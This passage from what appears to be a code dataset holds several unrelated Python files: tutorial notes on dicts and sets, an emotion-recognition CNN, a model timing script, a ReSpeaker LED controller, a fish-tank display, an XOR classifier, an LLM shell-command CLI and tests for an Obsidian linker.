'marks', 'Age'])\n#-----------------------------------------------------------------------------------------------------------------------------------------\n\n# Dictionary Methods\n\n\n# info = {\n#     \"name\": \"Parth Patil\",\n#     \"marks\": {\n#         \"Chem\": 93,\n#         \"Phy\": 93,\n#         \"Maths\": 93,\n#     },\n#     \"Age\": 18\n# }\n\n# #Keys Method\n# print(info.keys()) #Output dict_keys(['name', 'marks', 'Age'])\n# print(len(list(info.keys()))) #Output 3\n\n# #Values Method\n# print(info.values()) #Output dict_values(['Parth Patil', {'Chem': 93, 'Phy': 93, 'Maths': 93}, 18])\n# print(len(info.values())) #Output 3\n\n# #Items Method\n# print(info.items()) #Output dict_items([('name', 'Parth Patil'), ('marks', {'Chem': 93, 'Phy': 93, 'Maths': 93}), ('Age', 18)])\n# #It contains list having tuples inside in it. And the Tuples contains the key value pair of the dictionary\n# print(len(info.items())) #Output 3\n\n# #Get Method\n# print(info.get(\"name\")) #Output Parth Patil\n# print(info.get(\"name2\")) #Output None this method does not gives error only show none while print(info[\"name2\"]) will give error\n\n# #Update Method\n# info.update({\"city\" : \"Turbhe\"})\n# print(info) #Ouput  {'name': 'Parth Patil', 'marks': {'Chem': 93, 'Phy': 93, 'Maths': 93}, 'Age': 18, 'city': 'Turbhe'}\n#You can also add another dictionary but if the keys are similar in both the dictionary the values may replaced.\n#--------------------------------------------------------------------------------------------------------------------------------------------\n\n#Sets in Python\n#Set is the collection of the unordered items\n#Each elements in the set must be unique & immutable also this statement says that elements of the set is immutable not the set \n#Set is mutable\n#List and Dictionary cannot be in the sets beacuse they are muttable\n#List and Dictionary are unhashable because there hash values can be changed \n\n# collection = {1, 2, 3, 4, 2, 3, \"Hello\" , \"World\" , \"Hello\"}\n# print(collection) #Output {1, 2, 3, 4, 'Hello', 'World'} It will always ignore the duplicate elements in the set\n# print(len(collection)) #Output 6 Length function will also ignore the duplicate elements of the sets\n# print(type(collection)) #Output <class 'set'>\n#--------------------------------------------------------------------------------------------------------------------------------------------\n\n# Empty Set\n# null = set() # This is an empty set\n#--------------------------------------------------------------------------------------------------------------------------------------------\n\n#Sets Method\n\n#Add Method\n# collection = set()\n# collection.add(12)\n# collection.add(\"parth\")\n# collection.add((1, 2, 3, 4))\n# print(collection) #Output {(1, 2, 3, 4), 12, 'parth'}\n# print(len(collection)) #It only counts the element type not the actual element #Output 3\n#--------------------------------------------------------------------------------------------------------------------------------------------\n\n# #Remove Method \n# collection.remove(12)\n# print(collection) #Output {(1, 2, 3, 4), 'parth'}\n#--------------------------------------------------------------------------------------------------------------------------------------------\n\n#Clear Method\n# collection.clear()\n# print(collection) #Output set() it gives an empty set\n#--------------------------------------------------------------------------------------------------------------------------------------------\n\n#Pop Method\n#collection.pop() Randomly picks any value from the above set\n#--------------------------------------------------------------------------------------------------------------------------------------------\n\n# #Union Method\n# collection1 = {1, 2, 3, 4, 5}\n# collection2 = {5, 4, 3, 2, 1}\n# collection1.union(collection2)\n# prin",
    "# -*- coding: utf-8 -*-\n\"\"\"Copy of musicemotion1.ipynb\n\nAutomatically generated by Colab.\n\nOriginal file is located at\n    https://colab.research.google.com/drive/1V1Tcz6VipfqOFDlv8Umkh43w_OOLc9Ef\n\"\"\"\n\nimport pandas as pd\nfrom keras.preprocessing.image import ImageDataGenerator\nfrom keras.models import Sequential\nfrom keras.layers import Dense,Dropout,Flatten\nfrom keras.layers import Conv2D,MaxPooling2D\nfrom keras.optimizers import Adam\nimport os\nimport numpy as np\nfrom sklearn.model_selection import train_test_split\n\ndf = pd.read_csv('/content/fer2013.csv')\ndf\n\nx = df['pixels']\n#x = df['pixels'].apply(pd.to_numeric, errors='coerce').astype(np.float64)\nx\n\ny = df['emotion']\ny\n\nxtrain,xtest,ytrain,ytest=train_test_split(x,y,test_size=0.25,random_state=42)\n\nxtrain\n\nytrain\n\nxtest\n\nytest\n\nimport numpy as np\n\nlabels_dict = ['Angry','Disgust', 'Fear', 'Happy','Neutral','Sad','Surprise']\none_hot_labels = np.zeros((len(labels_dict), 7))\n\nfor i, label in enumerate(labels_dict):\n    one_hot_labels[i, i] = 1\n\nprint(one_hot_labels)\n\nimport numpy as np\n\npixel_values =df['pixels'].values  # 1D array of pixel values\n\n#calculate the number of images\nnum_images=len(pixel_values)//(48*48)\n\n# Reshape the pixel values considering the number of images\npixel_values_2d = pixel_values[:num_images * 48 * 48].reshape(-1, 48*48)\n\nprint(pixel_values_2d.shape)  # (num_images, 48, 48)\n\ntraining = df.loc[df[\"Usage\"] == \"Training\"]\npublic_test = df.loc[df[\"Usage\"] == \"PublicTest\"]\nprivate_test = df.loc[df[\"Usage\"] == \"PrivateTest\"]\n\nprint(\"Train = \", training.shape)\nprint(\"Test public = \", public_test.shape)\nprint(\"Test private = \", private_test.shape)\n\n# Assuming the csv file has a column named 'Usage' that indicates whether the sample is for training or testing\nTraining = df[df['Usage'] == 'Training']\nPrivateTest = df[df['Usage'] == 'PrivateTest']\nPublicTest=df[df['Usage']=='PublicTest']\n# Get the number of train images\nnum_train_images = len(Training)\n\n# Get the number of test images\nnum_test_Private_images = len(PrivateTest)\nnum_test_Public_images = len(PublicTest)\n\n\n# Get the total number of images\ntotal_images = num_train_images + num_test_Private_images +  num_test_Public_images\n\nprint(f\"Number of train images: {num_train_images}\")\nprint(f\"Number of test images: {num_test_Private_images}\")\nprint(f\"Number of test images: {num_test_Public_images}\")\n\nprint(f\"Total number of images: {total_images}\")\n\nprint(\"========================= Emotion Data ===========================\")\nprint(\"train_data = \\n{}, \\npublic_data = \\n{}, \\nprivate_data = \\n{}\".format(training[\"emotion\"].value_counts(),\n      public_test[\"emotion\"].value_counts(), private_test[\"emotion\"].value_counts()))\n\nfrom keras.utils import to_categorical\ntrain_labels = training[\"emotion\"]\ntrain_labels = to_categorical(train_labels)\n\ntrain_pixels = training[\"pixels\"].str.split(\" \").tolist()\ntrain_pixels = np.float64(train_pixels)\ntrain_pixels = train_pixels.reshape((28709,48, 48, 1))\ntrain_pixels = train_pixels.astype(\"float64\") / 255\n\nprivate_labels = private_test[\"emotion\"]\nprivate_labels = to_categorical(private_labels)\n\nprivate_pixels = private_test[\"pixels\"].str.split(\" \").tolist()\nprivate_pixels = np.float64(private_pixels)\nprivate_pixels = private_pixels.reshape((3589,48, 48, 1))\nprivate_pixels = private_pixels.astype(\"float64\") / 255\npublic_labels = public_test[\"emotion\"]\npublic_labels = to_categorical(public_labels)\n\npublic_pixels = public_test[\"pixels\"].str.split(\" \").tolist()\npublic_pixels = np.float64(public_pixels)\npublic_pixels = public_pixels.reshape((3589,48, 48, 1))\npublic_pixels = public_pixels.astype(\"float64\") / 255\n\nprint(pixel_values_2d.dtype)\n\nimport seaborn as sns\nimport matplotlib.pyplot as plt\nimport numpy as np\n\n# Assuming pixel_values_2d is the same as train_pixels\npixel_values_2d = pixel_values\n\n# Convert pixel values to numpy array of floats\npixel_values_2d_float = np.array([np.array(x.split(), dtype=np.float64) for x in pixel_values_2d])\n\n# Normalize pixel values\npixel_values_norm = (pixel_values_2d_float - np.min(pixel_values_2d_float)) / (np.max(pixel_values_2d_float) - np.min(pixel_values_2d_float))\n\nplt.figure(0, figsize=(15,6))\nfor i in range(15):\n    plt.subplot(3,5,i+1)\n    img = np.array(pixel_values_2d[i].split(),dtype=np.uint8).reshape(48, 48)  # Convert to uint8 and reshape to 48x48 image\n    plt.imshow(img, cmap=\"gray\")\n\nplt.tight_layout()\nplt.show()\n\npixel_values_2d_float = pixel_values_2d_float / 255.0\nprint(np.min(pixel_values_2d_float), np.max(pixel_values_2d_float))\n\nlabels_dict=['Angry','Disgust', 'Fear', 'Happy','Neutral','Sad','Surprise']\n\nmodel = Sequential()\n\nmodel.add(Conv2D(32, kernel_size=(3, 3), activation='relu', input_shape=(48,48,1)))\n\nmodel.add(Conv2D(64, kernel_size=(3, 3), activation='relu'))\nmodel.add(MaxPooling2D(pool_size=(2, 2)))\nmodel.add(Dropout(0.1))\n\nmodel.add(Conv2D(128, kernel_size=(3, 3), activation='relu'))\nmodel.add(MaxPooling2D(pool_size=(2, 2)))\nmodel.add(Dropout(0.1))\n\nmodel.add(Conv2D(256, kernel_size=(",
    "from transformers import AutoTokenizer, AutoModelForCausalLM\nimport torch\nimport os\nimport time\n\nmodel_path = \"/leonardo_scratch/large/userexternal/<username>/model/SmolLM-1.7B\"\noutput_folder = \"/leonardo_scratch/large/userexternal/<username>/dock-exp\"\nresult_file = os.path.join(output_folder, \"result.txt\")\nerror_file = os.path.join(output_folder, \"error.txt\")\ntime_file = os.path.join(output_folder, \"time-bench.txt\")\n\nos.makedirs(output_folder, exist_ok=True)\n\nfor file_path in [result_file, error_file, time_file]:\n    if os.path.exists(file_path):\n        os.remove(file_path)\n\ntry:\n    os.environ[\"TOKENIZERS_PARALLELISM\"] = \"false\"\n    tokenizer = AutoTokenizer.from_pretrained(model_path)\n    model = AutoModelForCausalLM.from_pretrained(\n        model_path, torch_dtype=torch.float16, device_map=\"cuda\"\n    )\n\n    model.generation_config.cache_implementation = \"static\"\n    model.generation_config.max_batch_size = 8\n    model.forward = torch.compile(model.forward, mode=\"reduce-overhead\", fullgraph=True)\n\n    input_text = \"Alice and Bob \"\n    input_ids = tokenizer(input_text, return_tensors=\"pt\").to(\"cuda\")\n\n    start_time = time.time()\n    outputs = model.generate(**input_ids, max_length=100, use_cache=True)\n    end_time = time.time()\n\n    result = tokenizer.batch_decode(outputs, skip_special_tokens=True)\n    with open(result_file, \"w\") as f:\n        f.write(\"\\n\".join(result))\n\n    time_taken = end_time - start_time\n    with open(time_file, \"w\") as f:\n        f.write(f\"Time taken for generation: {time_taken:.4f} seconds\\n\")\n\nexcept Exception as e:\n    with open(error_file, \"w\") as f:\n        f.write(str(e))\n",
    "#!/usr/bin/env python3\n\"\"\"Controls the LEDs and sounds on the ReSpeaker 2mic HAT.\"\"\"\nimport argparse\nimport asyncio\nimport logging\nimport time\nimport subprocess\nimport os\nfrom functools import partial\nfrom math import ceil\nfrom typing import Tuple\n\nimport gpiozero\nimport spidev\nfrom wyoming.asr import Transcript\nfrom wyoming.event import Event\nfrom wyoming.satellite import (\n    RunSatellite,\n    SatelliteConnected,\n    SatelliteDisconnected,\n    StreamingStarted,\n    StreamingStopped,\n)\nfrom wyoming.server import AsyncEventHandler, AsyncServer\nfrom wyoming.vad import VoiceStarted\nfrom wyoming.wake import Detection\n\n_LOGGER = logging.getLogger()\n\nNUM_LEDS = 3\nLEDS_GPIO = 12\nRGB_MAP = {\n    \"rgb\": [3, 2, 1],\n    \"rbg\": [3, 1, 2],\n    \"grb\": [2, 3, 1],\n    \"gbr\": [2, 1, 3],\n    \"brg\": [1, 3, 2],\n    \"bgr\": [1, 2, 3],\n}\n\nasync def play_sound(sound_file: str):\n    \"\"\"Play a sound file using aplay.\"\"\"\n    try:\n        proc = await asyncio.create_subprocess_exec(\n            'aplay',\n            '-D',\n            'plughw:CARD=seeed2micvoicec,DEV=0',\n            sound_file,\n            stdout=asyncio.subprocess.PIPE,\n            stderr=asyncio.subprocess.PIPE\n        )\n        await proc.communicate()\n    except Exception as e:\n        _LOGGER.error(f\"Error playing sound: {e}\")\n\nasync def main() -> None:\n    \"\"\"Main entry point.\"\"\"\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--uri\", required=True, help=\"unix:// or tcp://\")\n    parser.add_argument(\"--debug\", action=\"store_true\", help=\"Log DEBUG messages\")\n    parser.add_argument(\n        \"--led-brightness\",\n        type=int,\n        choices=range(1, 32),\n        default=31,\n        help=\"LED brightness (integer from 1 to 31)\",\n    )\n    parser.add_argument(\n        \"--sounds-dir\",\n        type=str,\n        default=\"/home/dihan/sounds\",\n        help=\"Directory containing sound files\",\n    )\n    args = parser.parse_args()\n\n    logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO)\n    _LOGGER.debug(args)\n\n    # Create sounds directory if it doesn't exist\n    os.makedirs(args.sounds_dir, exist_ok=True)\n\n    _LOGGER.info(\"Ready\")\n\n    # Turn on power to LEDs but keep them off\n    led_power = gpiozero.LED(LEDS_GPIO, active_high=False)\n    led_power.on()\n\n    leds = APA102(num_led=NUM_LEDS, global_brightness=args.led_brightness)\n    # Initialize LEDs to off\n    for i in range(NUM_LEDS):\n        leds.set_pixel(i, 0, 0, 0)\n    leds.show()\n\n    # Start server\n    server = AsyncServer.from_uri(args.uri)\n\n    try:\n        await server.run(partial(LEDsEventHandler, args, leds))\n    except KeyboardInterrupt:\n        pass\n    finally:\n        # Ensure LEDs are off when shutting down\n        for i in range(NUM_LEDS):\n            leds.set_pixel(i, 0, 0, 0)\n        leds.show()\n        leds.cleanup()\n        led_power.off()\n\n\n# -----------------------------------------------------------------------------\n\n_BLACK = (0, 0, 0)\n_WHITE = (255, 255, 255)\n_RED = (255, 0, 0)\n_YELLOW = (255, 255, 0)\n_BLUE = (0, 0, 255)\n_GREEN = (0, 255, 0)\n\nclass LEDsEventHandler(AsyncEventHandler):\n    \"\"\"Event handler for clients.\"\"\"\n\n    def __init__(\n        self,\n        cli_args: argparse.Namespace,\n        leds: \"APA102\",\n        *args,\n        **kwargs,\n    ) -> None:\n        super().__init__(*args, **kwargs)\n\n        self.cli_args = cli_args\n        self.client_id = str(time.monotonic_ns())\n        self.leds = leds\n        self.is_processing = False\n        self.sounds_dir = cli_args.sounds_dir\n        self.error_task = None\n        self.streaming = False\n        self.timeout_task = None\n        \n        # Initialize LEDs to off\n        self.color(_BLACK)\n        _LOGGER.debug(\"Client connected: %s\", self.client_id)\n\n    async def handle_event(self, event: Event) -> bool:\n        \"\"\"Handle event from satellite.\"\"\"\n        _LOGGER.debug(event)\n\n        if Detection.is_type(event.type):\n            # Cancel any existing timeout\n            if self.timeout_task and not self.timeout_task.done():\n                self.timeout_task.cancel()\n            \n            # Blue for wake word detection and play chime\n            self.color(_BLUE)\n            self.is_processing = True\n            await play_sound(os.path.join(self.sounds_dir, \"aha.wav\"))\n            \n            # Start timeout task after chime plays\n            self.timeout_task = asyncio.create_task(self.handle_timeout())\n            \n        elif StreamingStarted.is_type(event.type):\n            self.streaming = True\n            if self.is_processing:\n                self.color(_YELLOW)\n                \n        elif StreamingStopped.is_type(event.type):\n            self.streaming = False\n            # If we're still processing but no error occurred, reset state\n            if self.is_processing and not self.error_task:\n                self.reset_state()\n            \n        elif event.type == \"error\":\n            # Handle both error types\n            error_code = event.data.get(\"code\", \"\")\n            if er",
    "import time\nimport random\nimport pngdec\nimport ntptime\n\nimport machine\nfrom presto import Presto\nfrom picovector import ANTIALIAS_NONE, PicoVector, Transform\n\n# Should the time be shown?\nSHOW_TIME = True\n\n# Timezone offset, can be + or -\nUTC_OFFSET = 1\n\n\npresto = Presto(full_res=False, ambient_light=True)\ndisplay = presto.display\nvector = PicoVector(display)\nWIDTH, HEIGHT = display.get_bounds()\n\nYELLOW = display.create_pen(255, 205, 0)\nWHITE = display.create_pen(255, 255, 255)\n\nSPRITE_SIZE = 30\n\nif SHOW_TIME:\n    rtc = machine.RTC()\n\n    # WiFi setup\n    print('Connecting...')\n    wifi = presto.connect()\n\n    # Set the correct time using the NTP service.\n    print('Getting time...')\n    ntptime.settime()\n\n    vector.set_antialiasing(ANTIALIAS_NONE)\n    vector.set_font(\"cherry-hq.af\", 60)\n\n    t = Transform()\n    vector.set_transform(t)\n\ndisplay.set_layer(0)\n\nbg = pngdec.PNG(display)\nbg.open_file(\"fish_bg.png\")\nbg.decode(0, 0)\n    \npresto.update()\n\ndisplay.set_layer(1)\n\nclass Fish:\n    def __init__(self, x, y, file_left, file_right):\n        self.x = x\n        self.y = y\n        \n        self.dx = random.uniform(-1, 1)\n        self.dy = random.uniform(-1, 1)\n        \n        self.speed = 1.0\n        \n        self.png_left = pngdec.PNG(display)\n        self.png_left.open_file(file_left)\n        \n        self.png_right = pngdec.PNG(display)\n        self.png_right.open_file(file_right)\n\n        self.facing_left = self.dx < 0\n        self.flip_thresh = 0.2\n\n    def move(self, width, height):\n        self.dx += random.uniform(-0.1, 0.1)\n        self.dy += random.uniform(-0.1, 0.1)\n\n        mag = (self.dx ** 2 + self.dy ** 2) ** 0.5\n        if mag > 0:\n            self.dx = (self.dx / mag) * self.speed\n            self.dy = (self.dy / mag) * self.speed\n\n        self.x += self.dx\n        self.y += self.dy\n\n        if (self.x < 0 and self.dx < 0) or (self.x + SPRITE_SIZE > width and self.dx > 0):\n            self.dx *= -1\n        if (self.y < 0 and self.dy < 0) or (self.y + SPRITE_SIZE > height and self.dy > 0):\n            self.dy *= -1\n\n        if self.dx < -self.flip_thresh and not self.facing_left:\n            self.facing_left = True\n        elif self.dx > self.flip_thresh and self.facing_left:\n            self.facing_left = False\n    \n    def draw(self):\n        if self.facing_left:\n            self.png_left.decode(int(f.x), int(f.y))\n        else:\n            self.png_right.decode(int(f.x), int(f.y))\n\nimages = [\n    ['fish_red_left.png', 'fish_red_right.png'],\n    ['fish_blue_left.png', 'fish_blue_right.png'],\n    ['fish_purple_left.png', 'fish_purple_right.png']\n]\n\nfish = []\n\nfor imgs in images:\n    f = Fish(random.uniform(SPRITE_SIZE, WIDTH - SPRITE_SIZE), random.uniform(SPRITE_SIZE, HEIGHT - SPRITE_SIZE), imgs[0], imgs[1])\n    f.speed = random.uniform(0.3, 0.6)\n    fish.append(f)\n\nif SHOW_TIME:\n    def update_time_str():\n        try:\n            ntptime.settime()\n        except OSError:\n            print(\"Unable to contact NTP server\")\n\n        current_t = time.gmtime(time.time() + UTC_OFFSET * 60 * 60)\n        time_str = f'{current_t[3]:02d}:{current_t[4]:02d}'\n        \n        return time_str\n\n    time_str = update_time_str()\n    prev_update = time.time()\nprev_fps_update = time.time()\nfps = 0\n\nwhile True:\n    if SHOW_TIME:\n        if time.time() - prev_update >= 60:\n            time_str = update_time_str()\n            prev_update = time.time()\n    \n    display.set_pen(0)\n    display.clear()\n    \n    if SHOW_TIME:\n        _, _, w, _ = vector.measure_text(time_str)\n        cx = int(WIDTH // 2 - w // 2)\n\n        display.set_pen(WHITE)\n        vector.text(time_str, cx + 2, 96)\n        \n        display.set_pen(YELLOW)\n        vector.text(time_str, cx, 94)\n    \n    for f in fish:\n        f.move(WIDTH, HEIGHT)\n        f.draw()\n    \n    presto.update()\n    \n    fps += 1\n    if time.time() - prev_fps_update >= 1.0:\n        print(f'FPS: {fps}')\n        prev_fps_update = time.time()\n        fps = 0",
    "import torch\nimport torch.nn as nn\nimport torch.optim as optim\nfrom torch.utils.data import TensorDataset, DataLoader\nfrom torch.utils.data.dataset import random_split\nimport matplotlib.pyplot as plt\nimport numpy as np\n\nclass SimpleClassifier(nn.Module):\n\n    def __init__(self, num_inputs, num_hidden, num_outputs):\n        super().__init__()\n        # Initialize the modules we need to build the network\n        self.linear1 = nn.Linear(num_inputs, num_hidden)\n        self.act_fn = nn.Tanh()\n        self.linear2 = nn.Linear(num_hidden, num_outputs)\n\n    def forward(self, x):\n        # Perform the calculation of the model to determine the prediction\n        x = self.linear1(x)\n        x = self.act_fn(x)\n        x = self.linear2(x)\n        return x\n\n\ndevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n#device = 'cpu'\nprint(device)\nmodel = SimpleClassifier(num_inputs=2, num_hidden=4, num_outputs=1).to(device)\n# Printing a module shows all its submodules\nprint(model)\n\n\nfor name, param in model.named_parameters():\n    print(f\"Parameter {name}, shape {param.shape}\")\n\n\n\nimport torch\nfrom torch.utils.data import TensorDataset, DataLoader\nfrom torch.utils.data.dataset import random_split\nimport matplotlib.pyplot as plt\nimport numpy as np\n\n\n\n# Corrected Continuous XOR logic function\ndef continuous_xor(x, y):\n    # Convert to integers for bitwise XOR, then convert back to float if needed\n    return ((x > 0).float().int() ^ (y > 0).float().int()).float()\n\n\n# Generate random (x, y) pairs in the range of [-1, 1]\nn_samples = 10000\n\n\n\nx = (torch.rand(n_samples, 1, device=device) * 2 - 1).to(device)  # Scale to [-1, 1]\ny = (torch.rand(n_samples, 1, device=device) * 2 - 1).to(device)  # Scale to [-1, 1]\n\n# Apply the continuous XOR logic\nlabels = continuous_xor(x, y)\n\n# Combine the (x, y) pairs\ninputs = torch.cat((x, y), dim=1)\n\n# Create a TensorDataset\ndataset = TensorDataset(inputs, labels)\n\n# Split the dataset into train, validation, and test sets\ntrain_size = int(n_samples * 0.8)  # 80% of the dataset\nval_size = int(n_samples * 0.05)  # 5% of the dataset\ntest_size = n_samples - (train_size + val_size)  # The remaining 15%\ntrain_dataset, val_dataset, test_dataset = random_split(dataset, [train_size, val_size, test_size], generator=torch.Generator().manual_seed(42))\n\n\n\n# Create DataLoader for each set\nbatch_size = 32\ntrain_loader = DataLoader(train_dataset, batch_size=batch_size, shuffle=True, num_workers=0)\nval_loader = DataLoader(val_dataset, batch_size=batch_size, shuffle=False, num_workers=0)\ntest_loader = DataLoader(test_dataset, batch_size=batch_size, shuffle=False, num_workers=0)\n\n\n\n# Visualization of a batch from the training set\n\n\n\n\noptimizer = optim.SGD(model.parameters(), lr=0.01)\n\n#import torch.optim as optim\n\n#optimizer = optim.Adam(model.parameters(), lr=0.001)\n\n\n\n# Loss and Optimizer\ncriterion = nn.BCEWithLogitsLoss()\n\n# Training Loop\nepochs = 100\nloss_log = []\nepoch_log = []\nfor epoch in range(epochs):\n    model.train()\n    for inputs, labels in train_loader:\n        inputs, labels = inputs.to(device), labels.to(device)\n\n        optimizer.zero_grad()\n        outputs = model(inputs)\n        loss = criterion(outputs, labels)\n        loss.backward()\n        optimizer.step()\n\n    # Validation Loop\n    model.eval()\n    val_loss = 0.0\n    with torch.no_grad():\n        for inputs, labels in val_loader:\n            inputs, labels = inputs.to(device), labels.to(device)\n            outputs = model(inputs)\n            loss = criterion(outputs, labels)\n            val_loss += loss.item()\n    loss_log.append(val_loss/len(val_loader))\n    epoch_log.append(epoch)\n    print(f'Epoch {epoch+1}, Loss: {loss.item()}, Validation Loss: {val_loss / len(val_loader)}')\n\nimport matplotlib.pyplot as plt\nimport seaborn as sns\n\n# Assuming 'epochs' and 'val_loss' are your existing lists for 100 epochs\n# epochs = [1, 2, 3, ..., 100]\n# val_loss = [loss_value1, loss_value2, loss_value3, ..., loss_value100]\n\n# Set the seaborn style for plotting\nsns.set(style=\"whitegrid\")\n\n# Plotting with enhanced aesthetics for 100 epochs\nplt.figure(figsize=(14, 8))\nplt.plot(epoch_log, loss_log, label='Validation Loss',  markersize=8, linewidth=2)\n\n# Adjusting titles and labels with enhanced font settings\nplt.title('Validation Loss Over 100 Epochs', fontsize=20, fontweight='bold', color='darkslateblue')\nplt.xlabel('Epoch', fontsize=16, fontweight='bold')\nplt.ylabel('Validation Loss', fontsize=16, fontweight='bold')\n\n# Adjusting x-axis to show every 10th epoch for better readability\nplt.xticks(range(1, 101, 10), fontsize=12, fontweight='bold')\nplt.yticks(fontsize=12, fontweight='bold')\nplt.legend(fontsize=14, frameon=True, shadow=True, borderpad=1)\n\n# Optional: Remove the top and right spines for a cleaner look and adjust the grid\n\nplt.show()\n\n\n\nstate_dict = model.state_dict()\nprint(state_dict)\n\n\n# torch.save(object, filename). For the filename, any extension can be used\ntorch.save(state_dict, \"our_model.tar\")\n\n\n# Load state dict from the disk",
    "import warnings\n\nwarnings.filterwarnings(\"ignore\", message=\"Valid config keys have changed in V2:*\")\n\nimport os\nimport subprocess\nimport tempfile\nfrom typing import Optional\nimport platform\nfrom pathlib import Path\nimport re\n\nimport click\nfrom litellm import litellm\nfrom promptic import llm\nfrom pydantic import BaseModel\nfrom rich.console import Console\nfrom rich.panel import Panel\nfrom rich.status import Status\nfrom rich.pretty import pprint\nfrom rich.syntax import Syntax\nfrom rich.prompt import Prompt\nfrom ruamel.yaml import YAML\n\n__version__ = \"2.2.6\"\n\nDEFAULT_VALUES = {\n    \"model\": \"gpt-4o\",\n    \"api_key\": None,\n    \"yolo\": False,\n    \"attempts\": 5,\n    \"verify\": False,\n    \"cleanup\": False,\n    \"synchronous\": False,\n    \"python\": False,\n}\n\nCOMMAND_SYSTEM_PROMPT = \"\"\"\nYou are an expert system administrator tasked with creating shell commands to fulfill the user's queries.\nYour commands should be concise, use appropriate flags/options, and handle paths and special characters safely.\n\nFocus on:\n- Using the most appropriate command-line tools for each task\n- Platform-specific considerations (Windows vs Unix)\n- Proper error handling and user feedback\n- Security best practices\n- You cannot use `sudo`\n\"\"\"\n\nPYTHON_SYSTEM_PROMPT = \"\"\"\nYou are an expert Python developer tasked with writing scripts to fulfill user's queries.\nYour scripts should be concise, use modern Python idioms, and leverage appropriate libraries.\n\nKey guidelines:\n- Return complete, runnable Python scripts that use the necessary imports\n- Prefer standard library solutions when appropriate\n- Scripts should be self-contained and handle their own dependencies via uv\n- Script should be as concise as possible while maintaining legibility\n- All scripts should include proper uv script metadata headers with dependencies\n- The script should be written such that it only succeeds if it satisfies the user's query. Otherwise, it should fail.\n- If successful, the script should print a message to stdout with all relevant information.\n\nImportant uv script format:\nScripts must start with metadata in TOML format:\n```\n# /// script\n# dependencies = [\n#    \"package1>=1.0\",\n#    \"package2<2.0\"\n# ]\n# ///\n```\n\nThis metadata allows uv to automatically create environments and manage dependencies.\nThe script will be executed using `uv run` which handles installing dependencies.\n\nWhen fixing errors:\n1. Carefully analyze any error messages or unexpected output\n2. Make targeted fixes while maintaining the script's core functionality\n3. Ensure all imports and dependencies are properly declared\n4. Test edge cases and error conditions\n\nRemember to handle common scenarios like:\n- File and directory operations\n- Process management\n- Network requests\n- System information gathering\n- Error handling and user feedback\n\nFocus on writing reliable, production-quality code that solves the user's needs efficiently.\n\"\"\"\n\nconsole = Console()\n\nyaml = YAML()\n\nconfig_path = Path.home() / \".config\" / \"skeet\" / \"config.yaml\"\n\nif config_path.exists():\n    configurations = yaml.load(config_path)\nelse:\n    configurations = {}\n\n\nclass Result(BaseModel):\n    \"\"\"Model for LLM response structure\"\"\"\n\n    command_or_script: str\n    message_to_user: str\n    the_query_was_satisfied: bool = False\n    i_have_seen_the_last_terminal_output: bool = False\n\n    def __init__(self, **data):\n        # Clean up any backticks from command_or_script before initialization\n        # Deepseek occasionally adds them for some reason\n        if \"command_or_script\" in data:\n            data[\"command_or_script\"] = (\n                data[\"command_or_script\"].replace(\"```\", \"\").strip().strip(\"`\")\n            )\n        super().__init__(**data)\n\n\ndef stream_output(process, output_queue):\n    \"\"\"Stream output from a subprocess to a queue\"\"\"\n    for line in iter(process.stdout.readline, \"\"):\n        output_queue.put(line)\n    process.stdout.close()\n\n\ndef run_command(command: str, verbose: bool) -> tuple[str, int]:\n    \"\"\"Run the given command and return the output\"\"\"\n    with Status(\"[bold blue]Running command...\", console=console):\n        process = subprocess.Popen(\n            command,\n            shell=True,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.STDOUT,\n            text=True,\n            bufsize=1,\n            universal_newlines=True,\n        )\n\n        # Collect output while streaming it\n        output_lines = []\n        while True:\n            line = process.stdout.readline()\n            if not line and process.poll() is not None:\n                break\n            if line:\n                output_lines.append(line)\n                if verbose:\n                    console.print(line.rstrip())\n\n        process.stdout.close()\n        return_code = process.wait()\n\n        return \"\".join(output_lines).strip(), return_code\n\n\ndef run_script(script: str, cleanup: bool, verbose: bool) -> tuple[str, int, str]:\n    \"\"\"Run the given script using uv and return the output\"\"\"\n\n    with tempfile.NamedTemporaryFile",
    "import os\nimport tempfile\nimport unittest\nfrom obsidianlinker import find_markdown_files, link_files\n\nclass Tests(unittest.TestCase):\n\n    def setUp(self):\n        self.temp_dir = tempfile.TemporaryDirectory()\n        self.file1_path = os.path.join(self.temp_dir.name, \"Object-Oriented Programming.md\")\n        self.file2_path = os.path.join(self.temp_dir.name, \"Functional Programming.md\")\n        self.file3_path = os.path.join(self.temp_dir.name, \"README.md\")\n        self.file4_path = os.path.join(self.temp_dir.name, \"Object.md\")\n\n    def tearDown(self):\n        self.temp_dir.cleanup()\n\n    def create_file(self, path, content):\n        with open(path, 'w', encoding='utf-8') as f:\n            f.write(content)\n\n    def test_simple_linking(self):\n        self.create_file(self.file1_path, \"This is a file about object-oriented programming.\")\n        self.create_file(self.file3_path, \"This README mentions object-oriented programming.\")\n\n        markdown_files = find_markdown_files(self.temp_dir.name)\n        edited_files, total_links_added = link_files(markdown_files)  # Capture the return value\n\n        with open(self.file3_path, 'r', encoding='utf-8') as f:\n            content = f.read()\n            self.assertIn(\"[[object-oriented programming]]\", content)\n        self.assertIn(self.file3_path, edited_files)  # Verify the file was edited\n\n    def test_keep_original_case(self):\n        self.create_file(self.file1_path, \"This is a file about object-oriented programming.\")\n        self.create_file(self.file3_path, \"This README mentions Object-Oriented Programming.\")\n\n        markdown_files = find_markdown_files(self.temp_dir.name)\n        edited_files, total_links_added = link_files(markdown_files)\n        \n        with open(self.file3_path, 'r', encoding='utf-8') as f:\n            content = f.read()\n            self.assertIn(\"[[Object-Oriented Programming]]\", content)\n        self.assertIn(self.file3_path, edited_files)  # Verify the file was edited\n\n    def test_keep_original_case_1(self):\n        self.create_file(self.file1_path, \"This is a file about Object-Oriented Programming.\")\n        self.create_file(self.file3_path, \"This README mentions object-oriented programming.\")\n\n        markdown_files = find_markdown_files(self.temp_dir.name)\n        edited_files, total_links_added = link_files(markdown_files)\n\n        with open(self.file3_path, 'r', encoding='utf-8') as f:\n            content = f.read()\n            self.assertIn(\"[[object-oriented programming]]\", content)\n        self.assertIn(self.file3_path, edited_files)\n\n    def test_no_links(self):\n        self.create_file(self.file1_path, \"This is a file about object-oriented programming.\")\n        self.create_file(self.file3_path, \"This README does not mention any programming languages.\")\n\n        markdown_files = find_markdown_files(self.temp_dir.name)\n        edited_files, total_links_added = link_files(markdown_files)\n\n        with open(self.file3_path, 'r', encoding='utf-8') as f:\n            content = f.read()\n            self.assertNotIn(\"[[Object-Oriented Programming]]\", content)\n            